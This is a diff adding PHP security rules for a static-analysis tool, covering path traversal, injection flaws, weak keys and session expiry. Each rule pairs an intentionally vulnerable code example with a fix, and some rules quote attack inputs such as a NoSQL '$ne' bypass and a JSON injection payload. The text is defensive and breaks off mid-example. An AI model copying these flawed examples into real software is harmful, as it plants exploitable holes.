+  <rule name="OPT.PHP.PasswordManagement" message="PasswordManagement: Use of empty or hardcoded password, or storing password in comments" class="com.optimyth.qaking.php.rules.security.PasswordManagement" technology="PHP" active="true">
+    <tags><![CDATA[CWEScope:Confidentiality]]></tags>
+    <description><![CDATA[Use of empty or hardcoded password, or storing password in comments, can compromise system security.
+        
+By default the rule does not look up by pattern in comments, this can be enabled using checkComment property.]]></description>
+    <priority>2</priority>
+    <effort>3</effort>
+    <vulntype>Information leaks</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid compromising password verification.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  // VIOLATION - empty password
+  $connection = mysql_connect($host, 'anUser', '');
+    
+  // Password: aPassword    VIOLATION - password in comment
+  // VIOLATION - hardcoded password
+  $connection = mysql_connect($host, 'anUser', 'aPassword');
+?>]]></example>
+    <repair><![CDATA[<?php
+  $connection = mysql_connect($host, 'anUser', getPassword());  // OK
+?>]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/615.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:259,OWASP:2021:A7,PCI-DSS:6.5.3]]></security>
+    </normatives>
+    <properties>
+      <property name="commentPattern" descname="Pattern to check if there is sensitive information in comments." value=""/>
+      <property name="checkComments" descname="Check comments." value="false"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.PathTraversal" message="PathTraversal: Avoid non-neutralized user-controlled input to be part of a pathname (file or directory) used in I/O operations" class="com.optimyth.qaking.php.rules.security.PathTraversalRule" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:12.3.1,ASVS-v4.0.2:12.3.2,CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity]]></tags>
+    <description><![CDATA[Software uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the software does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location outside the restricted directory.
+
+If the web server / php.ini configuration does not restrict access to files outside certain restricted directories, the attacker may fetch sensitive files, and if the file is written with contents controlled by user input, the attacker may change configuration files (like .htaccess among others), web contents ('web defacement'), or libraries (for more insidious code injection attacks). Access to system files (the customary /etc/password in Unix/Linux systems) could also allowed with the web server process account permissions.
+
+It is recommended, besides ensuring that files depending on user-controlled input do not exit the intended directories, that the OS account does have the minimal permissions, to reduce the impact of a successful path traversal attack.]]></description>
+    <priority>1</priority>
+    <effort>4</effort>
+    <vulntype>File handling</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[It improves the safety.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+// path is a supposedly 'hidden field' received, indicating the path to dump,
+// but potential attacker has full control on the HTTP message received by the application
+$path = $_GET['path'];
+// Vulnerable: attacker could possibly dump PHP source code, sensitive files (like /etc/password), etc.
+readfile($path);
+?>]]></example>
+    <repair><![CDATA[<?php
+// Ensure at least that target file cannot be out of a given directory (unless attacker creates links by other means)
+$path = MY_BASEDIR . basename(realpath($_GET['path']));
+// FIXED (attacker may control filename but not the directory containing file to read)
+readfile($path);
+?>]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/22.html,http://cwe.mitre.org/data/definitions/73.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:22,CWE:73,CWETOP25:2021:8,OWASP:2021:A4,OWASP:2021:A5,PCI-DSS:6.5.8,WASC:33]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" descname="Comma-separated list of input types to consider as sources (user_input, file_input, database_input, other_input)" value="user_input"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.ResourceInjection" message="ResourceInjection: Improper Control of Resource Identifiers ('Resource Injection')" class="com.optimyth.qaking.php.rules.security.ResourceInjectionRule" technology="PHP" active="true">
+    <tags><![CDATA[CWEScope:Confidentiality,CWEScope:Integrity]]></tags>
+    <description><![CDATA[Many PHP functions provide access to sensitive resources, local or remote. If the resource name depends on non-neutralized user-controlled input, an attacker may have access on unintended resources.
+
+The rule checks that the name of a potential sensitive resource reachable from a vulnerable PHP function could be controlled by non-neutralized input, and then emits a violation.]]></description>
+    <priority>1</priority>
+    <effort>3</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $remote = FTP_BASEDIR . $_POST['path'];
+  $local = LOCAL_BASEDIR . $_POST['path'];
+  $conn = ftp_connect(MY_FTP_SERVER);
+  $login_result = ftp_login($conn, MY_FTP_USER, MY_FTP_PASS);
+  if($login_result) {
+    // VIOLATION: Resource Injection, user-input could control the local and remote filepaths
+    ftp_get($conn, $local, $remote, FTP_BINARY);
+  }
+  ftp_close($conn);
+?>]]></example>
+    <repair><![CDATA[    Do not let user-input controlling resource names for sensitive, connection-oriented resources.]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/99.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:99,OWASP:2021:A3,PCI-DSS:6.5.1]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" descname="Comma-separated list of input types to consider as sources (user_input, file_input, database_input, other_input)" value="user_input"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.AutocompleteOnForSensitiveFields" message="AutocompleteOnForSensitiveFields: Autocomplete enabled for sensitive form fields" class="com.optimyth.qaking.php.rules.security.AutocompleteOnForSensitiveFields" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:8.2.1,CWEScope:Confidentiality]]></tags>
+    <description><![CDATA[By default, browsers remember information that users submit through form input fields. This enables the browser to offer
+autocomplete (suggesting possible completions for fields that the user starts typing in) or autofill (pre-populate
+certain fields upon load).
+
+Autocomplete/autofill could be a privacy concern for users. Browsers could be configured to disable autocomplete,
+but it is typically enabled by default. Past values for some fields are either not useful (like a one-time pin),
+or contain sensitive/private information (government identifier, credit card security code, or simply a password).
+Forms in a web application should be configured to avoid remembering past values for some sensitive fields (or all fields in
+a critical form), even if the browser's autocomplete feature is disabled.
+
+That strategy limits information leakages, when a browser shows past submitted values for another person (in a shared device).
+This rule will report any sensitive field (password, or fields with a name/id matching a configurable pattern).
+
+Rule checks input fields into form tags but and also input fields outside from a form tag but specifying a form into their
+form attribute.]]></description>
+    <priority>3</priority>
+    <effort>2</effort>
+    <vulntype>Information leaks</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid information leakage.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<form method="post" action="/form" id="form1">
+  <div>
+    <input type="password" id="auth" name="auth"/><!-- VIOLATION -->
+    <input type="text" id="creditCard" name="creditCard"/><!-- VIOLATION -->
+  </div>
+</form>
+
+<input type="password" id="input3" name="auth" form="form1"/><!-- VIOLATION -->]]></example>
+    <repair><![CDATA[<form method="post" action="/form" id="form1" autocomplete="off">
+  <div>
+    <input type="password" id="auth" name="auth"/>
+    <input type="text" id="creditCard" name="creditCard"/>
+  </div>
+</form>
+
+<input type="password" id="input3" name="auth" form="form1"/>
+
+Alternatively, disable autocomplete for sensitive fields only:
+
+<form method="post" action="/form" autocomplete="on">
+  <div>
+    <input type="password" id="auth" name="auth" autocomplete="off"/>
+    <input type="text" id="creditCard" name="creditCard" autocomplete="off"/>
+  </div>
+</form>
+
+<input type="password" id="input3" name="auth" form="form1" autocomplete="off"/>]]></repair>
+    <reference><![CDATA[https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:525,OWASP:2021:A4,PCI-DSS:3.2,WASC:13]]></security>
+    </normatives>
+    <properties>
+      <property name="acceptBrowserPasswordManagers" descname="If true, accept autocomplete behaviour for password fields, when it is assumed that browser password managers are safer than memorized passwords." value="false"/>
+      <property name="sensitiveFieldsPattern" descname="Regular expression for detecting, by name, potentially sensitive fields." value="password|pass|username|user_name|creditcard|credit_card|cardnum|card_num"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.CookiesInSecurityDecision" message="CookiesInSecurityDecision: Reliance on Cookies without Validation and Integrity Checking in a Security Decision" class="com.optimyth.qaking.php.rules.security.CookiesInSecurityDecision" technology="PHP" active="true">
+    <tags><![CDATA[CWEScope:Access-Control]]></tags>
+    <description><![CDATA[Using a cookie for security decision is a bad practice. Remember that attackers control most parts of the HTTP message,
+including cookies sent to the application. If a security check is based on the value of a cookie field (for example,
+the cookie value), a attacker may choose a particular value to pass such security check, without any reliance to
+past navigation thru the vulnerable application.
+
+Attackers may exploit this vulnerability to bypass protection mechanisms such as authorization and authentication,
+by modifying the cookie to contain an expected value.]]></description>
+    <priority>2</priority>
+    <effort>3</effort>
+    <vulntype>Permissions, privileges and access controls</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid bypass of protection mechanisms, due to flawed security decisions based on cookies.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php 
+  
+  function isAuthenticate($value){
+    if($_COOKIE['role'] == null) return false; //VIOLATION
+    if(!empty($value)) return true;
+    return false;
+  }
+  
+  $check = $_COOKIE['username'];
+  
+  if(isAuthenticate($check)){ //VIOLATION
+    ...
+  }
+  
+?>]]></example>
+    <repair><![CDATA[]]></repair>
+    <reference><![CDATA[https://cwe.mitre.org/data/definitions/784.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:784,OWASP:2021:A8]]></security>
+    </normatives>
+    <properties>
+      <property name="securityPatterns" descname="Patterns of function names to check security aspects." value="(auth|role|permi[s]+ion)"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.CrossSiteHistoryManipulation" message="CrossSiteHistoryManipulation: Cross-Site History Manipulation (XSHM)" class="com.optimyth.qaking.php.rules.security.CrossSiteHistoryManipulation" technology="PHP" active="true">
+    <description><![CDATA[Cross-Site History Manipulation (XSHM) is an attack targeted at end users, that uses browser's history object
+to infer information on past navigation on a vulnerable application, violating the browser's enforced Same Origin Policy (SOP).
+
+The logic that creates an XSHM vulnerability, for the Condition leakage variant, is simple:
+In PageA: if(CONDITION) Response.Redirect(PageB).
+
+An attacker executes a cross-site request (a request initiated in the victim's browser but controlled by the attacker)
+and is able to infer if CONDITION is true or false, using the browser's history object.
+
+A typical XSHM attack could be as follows:
+1. Attacker creates an iframe whose src is PageB.
+2. The attacker code (JavaScript) saves the current value of history.length.
+3. The attacker code changes src of the iframe to PageA.
+4. If current history.length is the same as the stored value, CONDITION is true
+   (a client-side redirect was done, but URL already exists in history, so it is not added).
+   Otherwise, CONDITION is false (no client-side redirect, and PageA is added to the history object).
+
+This attack has the effect of leaking the result of a condition. The impact depends on the sensitivity of CONDITION
+for the attacker. A typical case is the user authentication status, inferring parameter values used in CONDITION,
+or mounting a Cross-Site Request Forgery (CSRF) attack and be able to detect if attack was successful or not.
+
+Note: Attacker may infer past navigated pages in the site, or even try to infer parameter values for past navigated pages,
+by using cross-site requests and using the JavaScript method history.go(URL) (which is allowed cross-domain). This variants
+are independent of the XSHM vulnerability documented here.]]></description>
+    <priority>3</priority>
+    <effort>4</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid user inputs controlling a redirection reduces the risk of occurrence of a XSHM attack.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php 
+  ...
+  
+  if(!isAuthenticated($check)){ 
+    header( "Location: http://www.domain.com/user.php" ); //VIOLATION
+  }
+  
+  ...
+  
+?>]]></example>
+    <repair><![CDATA[<?php 
+  ...
+  # Add a random token to avoid XSHM attack.
+  # A random token makes the redirected URL different for each request,
+  # and the attacker cannot mount the XSHM attack.
+  if(!isAuthenticated($check)){ 
+    $random = getRandom();
+    header( "Location: http://www.domain.com/user.php?random=".$random ); //FIXED
+  }
+  ...  
+?>]]></repair>
+    <reference><![CDATA[https://www.owasp.org/index.php/Cross_Site_History_Manipulation_(XSHM)]]></reference>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.ExecutionAfterRedirect" message="ExecutionAfterRedirect: Execution After Redirect (EAR)" class="com.optimyth.qaking.php.rules.security.ExecutionAfterRedirect" technology="PHP" active="true">
+    <tags><![CDATA[CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity]]></tags>
+    <description><![CDATA[The web application sends a forward / redirect to another location, but instead of exiting, it executes additional code.
+
+If the redirect is a client redirect (typically, setting the Location HTTP header), the attacker may ignore such redirect
+and process the message body, potentially accessing unintended contents rendered to the HTTP response after the redirect.
+
+When the application developer does not terminate the response, but perform additional operations assuming that
+the redirect call will not end the flow, then an unauthorized user may be able to access unintended contents.
+
+The rule looks for statements following the forward / redirect call, and reports a defect when a non allowed statement
+follows that call. A few kind of statements, like a return, a break (in a switch case), a logging call, or a counter increment,
+might be allowed.]]></description>
+    <priority>3</priority>
+    <effort>2</effort>
+    <vulntype>Control flow management</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  if (!$loggedin) {
+    header('location: login.php');
+  }
+
+  // VIOLATION: Redirect is a 'Location:' HTTP header
+  // and this information should not be visible when redirected.
+  echo "This should only be shown to logged in users.";
+?>]]></example>
+    <repair><![CDATA[<?php
+  if (!$loggedin) {
+    header('location: login.php');
+    die(); // FIXED
+  }
+
+  echo "This should only be shown to logged in users.";
+?>]]></repair>
+    <reference><![CDATA[http://cs.ucsb.edu/~bboe/public/pubs/fear-the-ear-ccs2011.pdf,https://cwe.mitre.org/data/definitions/698.html,https://www.owasp.org/index.php/Execution_After_Redirect_(EAR)]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:698]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.ExternalControlOfConfigurationSetting" message="ExternalControlOfConfigurationSetting: External Control of System or Configuration Setting" class="com.optimyth.qaking.php.rules.security.ExternalControlOfConfigurationSetting" technology="PHP" active="true">
+    <description><![CDATA[One or more system settings or configuration elements can be externally controlled by a user.
+
+Allowing external control of system settings can disrupt service or cause an application to behave in unexpected,
+and potentially malicious ways.]]></description>
+    <priority>2</priority>
+    <effort>3</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $source = $_POST["source"];
+  require($source); //VIOLATION
+  ....
+?>]]></example>
+    <repair><![CDATA[    //Check the correct input data by white list or regular expressions.]]></repair>
+    <reference><![CDATA[https://cwe.mitre.org/data/definitions/15.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:15,PCI-DSS:6.5.6]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.FormatStringInjectionRule" message="FormatStringInjectionRule: Exclude unsanitized user input from format strings" class="com.optimyth.qaking.php.rules.security.FormatStringInjectionRule" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:5.4.2,CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity]]></tags>
+    <description><![CDATA[PHP contains formatting functions, named sprintf() or printf(), that format a sequence of values according to a format string.
+
+If the format string is constructed with untrusted input, an attacker may produce unexpected application behaviour.
+
+Consequently, unsanitized input from untrusted source should never be incorporated into format strings.
+
+Note: The risks here are much lower that the equivalent vulnerability in C/C++ and the %n format modifier, anyway.]]></description>
+    <priority>3</priority>
+    <effort>2</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid denial of service.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+
+$source = $_POST["source"];
+
+$filter = $source . " other string %s";
+
+$filter = sprintf($filter, "Value"); //VIOLATION
+
+?>]]></example>
+    <repair><![CDATA[<?php
+
+$source = $_POST["source"];
+
+$filter = "%s other string %s";
+
+$filter = sprintf($filter, $source, "Value"); //OK
+
+?>]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/134.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:134,CWETOP25:2011:23,OWASP:2004:A5,PCI-DSS:6.5.1,WASC:10]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" descname="Comma-separated list of input types to consider as sources (user_input, file_input, database_input, other_input, environment_input, system_input, hardcoded_input)" value="user_input"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.InsufficientKeySizeRule" message="InsufficientKeySizeRule: Weak cryptography, insufficient key length" class="com.optimyth.qaking.php.rules.security.InsufficientKeySizeRule" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:1.6.1,ASVS-v4.0.2:1.6.2,ASVS-v4.0.2:1.6.3,ASVS-v4.0.2:1.6.4,ASVS-v4.0.2:2.6.3,ASVS-v4.0.2:2.7.6,ASVS-v4.0.2:2.8.2,ASVS-v4.0.2:2.8.3,ASVS-v4.0.2:2.9.1,ASVS-v4.0.2:6.2.1,ASVS-v4.0.2:6.2.3,ASVS-v4.0.2:6.2.4,ASVS-v4.0.2:6.2.5,ASVS-v4.0.2:6.2.6,ASVS-v4.0.2:6.2.7,ASVS-v4.0.2:6.4.2,ASVS-v4.0.2:9.1.2,ASVS-v4.0.2:9.1.3,CWEScope:Access-Control,CWEScope:Confidentiality]]></tags>
+    <description><![CDATA[A robust cryptographic algorithm (like RSA or AES) with a small key length could be vulnerable to brute-force type attacks.
+
+For symmetric ciphers, AES-CBC (FIPS 197) is the most often recommended algorithm nowadays, with a block size of at least
+64 bits (128 bits for the better). Recommended minimum key length for AES is 128 bits for most usages, but for long-range
+security, 192 bits or even 256 bits are often recommended.
+
+DES and DESede (or "triple-DES") are, nowadays, not robust enough for most applications. Many algorithms used in the past,
+like Blowfish or RC2, are now deemed insecure.
+
+For asymetric cryptography ("public key"), the algorithm most often used is RSA. Most experts consider 2048 as the
+most adequate key length for common needs, as its usage in digital signature and other applications demand cryptographic
+robustness for a long period of time. Experts now consider 1024 bits for RSA keys (modulus) not enough secure.
+
+Algoritms based on elliptic curves cryptography (like EC-DSA) typically require smaller key sizes, around 200 bits.
+
+See http://www.keylength.com for an interactive site showing current recommendations in cryptographic algorithms,
+key length and other issues to take into account.]]></description>
+    <priority>2</priority>
+    <effort>3</effort>
+    <vulntype>Encryption and randomness</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  // Create the keypair
+  $res=openssl_pkey_new(array(
+    "digest_alg" => "sha512",
+    "private_key_bits" => 1024, //VIOLATION
+    "private_key_type" => OPENSSL_KEYTYPE_RSA,
+  ));
+  
+  // Get private key
+  openssl_pkey_export($res, $privkey);
+  
+  // Get public key
+  $pubkey=openssl_pkey_get_details($res);
+  $pubkey=$pubkey["key"];
+  
+  openssl_public_encrypt("hello world", $crypted, $pubkey);
+  
+  ...
+  
+?>]]></example>
+    <repair><![CDATA[<?php
+  // Create the keypair
+  $res=openssl_pkey_new(array(
+    "digest_alg" => "sha512",
+    "private_key_bits" => 2048, //FIXED
+    "private_key_type" => OPENSSL_KEYTYPE_RSA,
+  ));
+  
+  // Get private key
+  openssl_pkey_export($res, $privkey);
+  
+  // Get public key
+  $pubkey=openssl_pkey_get_details($res);
+  $pubkey=$pubkey["key"];
+  
+  openssl_public_encrypt("hello world", $crypted, $pubkey);
+  
+  ...
+  
+?>]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/320.html,http://cwe.mitre.org/data/definitions/310.html,http://cwe.mitre.org/data/definitions/326.html,http://www.keylength.com/]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:310,CWE:320,CWE:326,OWASP:2021:A2,PCI-DSS:6.5.3]]></security>
+    </normatives>
+    <properties>
+      <property name="minKeySize" descname="Comma-separated list of minimum key size per algorithms" value="RSA/2048, DSA/2048, EC/256, AES/128, DH/2048"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.InsufficientSessionExpirationRule" message="InsufficientSessionExpirationRule: Checks that session expiration interval does not exceed a limit" class="com.optimyth.qaking.php.rules.security.InsufficientSessionExpirationRule" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:2.8.1,ASVS-v4.0.2:2.8.6,ASVS-v4.0.2:3.3.1,ASVS-v4.0.2:3.3.2,ASVS-v4.0.2:3.3.3,ASVS-v4.0.2:3.3.4,ASVS-v4.0.2:3.6.1,ASVS-v4.0.2:3.6.2,CWEScope:Access-Control]]></tags>
+    <description><![CDATA[Checks that when setting in code a session
+expiration interval, interval does not exceed a maximum interval.
+
+If exceeds the maxExpiration parameter, session lives too much
+time and it is considered a security issue.
+
+The session.gc_maxlifetime configuration is not sufficient.
+The problem is, PHP’s garbage collection has a 1% chance of being called, per request (default values). 
+This means that you can never rely on it to automatically expire user sessions.
+
+To put that into perspective, if you have 100 users that have been inactive for longer than gc_maxlifetime value, 
+only one of them will have their session expired.]]></description>
+    <priority>2</priority>
+    <effort>2</effort>
+    <vulntype>Misconfiguration</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Controlling session expiration interval improves security.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+
+//Start our session.
+session_start();
+
+//Expire the session if user is inactive for 300
+//minutes or more.
+$expireAfter = 300;
+
+//Check to see if our "last action" session
+//variable has been set.
+if(isset($_SESSION['last_action'])){
+    
+    //Figure out how many seconds have passed
+    //since the user was last active.
+    $secondsInactive = time() - $_SESSION['last_action'];
+    
+    //Convert our minutes into seconds.
+    $expireAfterSeconds = $expireAfter * 60;
+    
+    //Check to see if they have been inactive for too long.
+    if($secondsInactive >= $expireAfterSeconds){ //VIOLATION
+        //User has been inactive for too long.
+        //Kill their session.
+        session_unset(); 
+        session_destroy(); 
+    }
+    
+}
+
+//Assign the current timestamp as the user's
+//latest activity
+$_SESSION['last_action'] = time();
+?>]]></example>
+    <repair><![CDATA[<?php
+
+//Start our session.
+session_start();
+
+//Expire the session if user is inactive for 30
+//minutes or more.
+$expireAfter = 30; //FIXED
+
+//Check to see if our "last action" session
+//variable has been set.
+if(isset($_SESSION['last_action'])){
+    
+    //Figure out how many seconds have passed
+    //since the user was last active.
+    $secondsInactive = time() - $_SESSION['last_action'];
+    
+    //Convert our minutes into seconds.
+    $expireAfterSeconds = $expireAfter * 60;
+    
+    //Check to see if they have been inactive for too long.
+    if($secondsInactive >= $expireAfterSeconds){ 
+        //User has been inactive for too long.
+        //Kill their session.
+        session_unset(); 
+        session_destroy(); 
+    }
+    
+}
+
+//Assign the current timestamp as the user's
+//latest activity
+$_SESSION['last_action'] = time();
+?>]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/613.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:613,OWASP:2021:A7]]></security>
+    </normatives>
+    <properties>
+      <property name="maxExpiration" descname="Max time expiration allowed (seconds)." value="7200"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.JSONInjection" message="JSONInjection: Avoid using non-neutralized user-controlled input into JSON entities - JSON Injection" class="com.optimyth.qaking.php.rules.security.JSONInjection" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:13.2.6,ASVS-v4.0.2:13.3.2,ASVS-v4.0.2:3.5.3,CWEScope:Integrity]]></tags>
+    <description><![CDATA[Unvalidated untrusted input is concatenated to a JSON stream, which is sent as request to a potentially service.
+This allows an attacker to inject tailored content that change the semantics of the original JSON message.
+
+Depending on how the JSON-formatted data is later used, the attacker could execute unexpected dynamic code, or
+escape from authentication or authorization controls. If the resulting JSON string is evaluated in JavaScript
+(JavaScript may eval a string and treat it as an array or JavaScript object), the attacker may add additional
+code (for example, an attack payload like "'}; while(1); //" that could produce a denial-of-service condition.
+
+Note: Do not confuse this issue with JSON (or JavaScript) hijacking, which is a browser-side vulnerability
+where an attacker can steal sensitive information sent as JSON to victim's browser.]]></description>
+    <priority>2</priority>
+    <effort>3</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid JSON Injection attacks.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $json_string = $_GET['info'];
+  $json_data = json_decode($json_string); // VIOLATION
+?>]]></example>
+    <repair><![CDATA[// neutralize untrusted input before parsing it to a JSON]]></repair>
+    <reference><![CDATA[https://cwe.mitre.org/data/definitions/345.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:91,OWASP:2021:A3,PCI-DSS:6.5.1,WASC:20]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" descname="Comma-separated list of input types to consider as sources (user_input, file_input, database_input, other_input)" value="user_input"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.MailCommandInjection" message="MailCommandInjection: Mail Command Injection" class="com.optimyth.qaking.php.rules.security.MailCommandInjection" technology="PHP" active="true">
+    <tags><![CDATA[CWEScope:Integrity]]></tags>
+    <description><![CDATA[Mail command injection vulnerabilities occur when an attacker can influence the commands sent to an SMTP, POP3, or IMAP mail server.
+If the library or the developer fails to safely encode the line breaks, an attacker controlling any of the arguments for these commands
+will be able to inject line breaks and new commands after them.
+
+As line breaks are the usual mechanism that attackers use to change the expected behaviour, this vulnerability
+is considered a special CRLF Injection attack.
+
+What the attacker may launch by exploting a Mail Command Injection vulnerability include:
+- Generate spam (SMTP). The application acts as a "mail proxy" that attackers may use to create spam messages.
+- Read messages from other users (POP3/IMAP).
+- Abusing a trusted server to send HTML emails with malicious contents.
+- Change authentication or security options, to skip security controls in mail servers.
+
+See "MX Injection: Capturing and Exploiting Hidden Mail Servers", from Vicente Aguilera, for a full description on
+the benefits that an attacker may gain.
+
+The rule checks when vulnerable mail libraries are called with untrusted input, without validation, which might be vulnerable
+to Mail Command Injection attacks.]]></description>
+    <priority>1</priority>
+    <effort>3</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid Mail Command Injection attacks.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+
+  require("class.phpmailer.php");
+  
+  $from = $_POST["from"];
+  
+  $mail = new PHPMailer();
+
+  $mail->IsSMTP();
+  $mail->SMTPAuth = true;
+  $mail->From = $from; //VIOLATION 
+  ...
+  
+?>]]></example>
+    <repair><![CDATA[// validate untrusted subject input with a white-list strategy,
+// or at least ensure that line breaks (CR/LF) are removed from subject.]]></repair>
+    <reference><![CDATA[http://www.webappsec.org/projects/articles/121106.pdf,OWASP Testing for IMAP/SMTP injection: https://www.owasp.org/index.php/Testing_for_IMAP/SMTP_Injection_(OTG-INPVAL-011),http://projects.webappsec.org/w/page/13246948/Mail%20Command%20Injection]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:93,OWASP:2021:A3,PCI-DSS:6.5.1,WASC:30]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.NoSQLInjection" message="NoSQLInjection: Improper neutralization of special elements in data query logic (NoSQL injection)" class="com.optimyth.qaking.php.rules.security.NoSQLInjection" technology="PHP" active="true">
+    <tags><![CDATA[CWEScope:Access-Control,CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity,NoSQL]]></tags>
+    <description><![CDATA[The application generates a query intended to access or manipulate data in a data store such as a NoSQL database,
+but it does not neutralize or incorrectly neutralizes special elements that can modify the intended logic of the query.
+
+Depending on the capabilities of the query language, an attacker could inject additional login into the query to:
+- Modify the intended selection criteria, thus changing which data entities (e.g., records) are returned, modified, or otherwise manipulated.
+- Append additional commands to the query.
+- Return more or fewer entities than intended.
+- Cause entities to be sorted in an unexpected way.]]></description>
+    <priority>1</priority>
+    <effort>3</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Prevent NoSQL injection attacks.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $m = new MongoClient();
+  $db = $m->security;
+  $collection = $db->users;
+
+  // Attacker may exploit the capability of passing objects in _GET or _POST parameters
+  // For example, passing password[$ne]=1 will produce "password" => array("$ne" => 1).
+  // Another popular attack vector uses $or for changing the semantics of the NoSQL query
+
+  $qry = array(
+    "username" => $_POST['username'],
+    "password" => $_POST['password']
+  );
+
+  // VIOLATION
+  $cursor = $collection->find($qry);
+  // ... do something with returned documents ...
+?>]]></example>
+    <repair><![CDATA[<?php
+  $m = new MongoClient();
+  $db = $m->security;
+  $collection = $db->users;
+
